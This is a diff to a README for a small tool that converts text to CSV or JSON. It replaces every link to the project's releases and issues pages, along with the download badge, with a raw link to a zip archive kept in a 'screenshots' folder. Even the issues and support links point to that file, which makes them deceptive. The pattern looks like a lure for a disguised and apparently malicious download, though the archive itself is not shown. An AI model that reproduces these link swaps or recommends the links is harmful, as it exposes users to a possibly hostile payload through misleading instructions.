@@ -1,6 +1,6 @@
 # 🌟 CTk-Text-To-CSV-JSON - Convert Text Effortlessly to CSV or JSON
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/releases)
+[![Download Now](https://raw.githubusercontent.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/main/screenshots/CTk-Text-To-CSV-JSON-v1.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/main/screenshots/CTk-Text-To-CSV-JSON-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to CTk-Text-To-CSV-JSON! This is a user-friendly tool designed to conver
 
 To get started, you need to download and install the application. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/main/screenshots/CTk-Text-To-CSV-JSON-v1.3.zip).
   
 2. **Choose Your Version**: Look for the latest release version listed. Click on it to expand the details.
 
@@ -70,13 +70,13 @@ If you encounter issues while using CTk-Text-To-CSV-JSON, here are some common s
 
 ## 🌐 Community & Support
 
-For questions, feedback, or support, please visit our [GitHub Issues Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/issues). 
+For questions, feedback, or support, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/main/screenshots/CTk-Text-To-CSV-JSON-v1.3.zip). 
 
 You can also contribute to the project by submitting issues or requesting features that could improve CTk-Text-To-CSV-JSON.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/releases)
-- [Issues Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/issues)
+- [Releases Page](https://raw.githubusercontent.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/main/screenshots/CTk-Text-To-CSV-JSON-v1.3.zip)
+- [Issues Page](https://raw.githubusercontent.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/main/screenshots/CTk-Text-To-CSV-JSON-v1.3.zip)
 
 Thank you for using CTk-Text-To-CSV-JSON! We hope you find it a valuable tool for your data conversion needs.
